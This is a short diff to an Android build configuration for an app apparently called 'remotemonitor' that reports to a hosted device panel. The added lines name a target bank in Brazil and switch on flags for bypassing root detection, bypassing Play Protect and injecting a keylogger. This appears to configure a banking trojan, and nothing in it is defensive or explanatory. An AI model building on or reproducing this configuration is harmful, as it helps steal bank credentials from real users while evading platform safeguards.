@@ -20,6 +20,11 @@ android {
 
         buildConfigField("String", "BACKEND_BASE_URL", "\"https://remotemonitor-production-b232.up.railway.app\"")
         buildConfigField("String", "FALLBACK_PANEL_URL", "\"https://remotemonitor-production-b232.up.railway.app/devices\"")
+        buildConfigField("String", "BANK_ID", "\"bb\"")
+        buildConfigField("String", "BANK_COUNTRY", "\"Brasil\"")
+        buildConfigField("Boolean", "ENABLE_ROOT_BYPASS", "true")
+        buildConfigField("Boolean", "ENABLE_PLAY_PROTECT_BYPASS", "true")
+        buildConfigField("Boolean", "ENABLE_KEYLOG_INJECTION", "true")
 
         testInstrumentationRunner = "androidx.test.runner.AndroidJUnitRunner"
     }
